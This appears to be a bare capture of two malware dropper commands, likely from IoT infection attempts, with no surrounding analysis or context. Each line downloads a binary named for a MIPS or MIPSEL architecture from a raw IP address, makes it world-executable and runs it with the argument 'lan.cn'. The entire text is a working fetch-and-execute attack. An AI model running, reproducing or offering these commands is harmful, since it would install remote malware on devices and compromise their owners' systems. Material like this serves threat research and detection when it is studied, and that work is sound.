wget http://45.95.146.126/zermips;chmod 777 zermips;./zermips lan.cn
wget http://45.95.146.126/zermpsl;chmod 777 zermpsl;./zermpsl lan.cn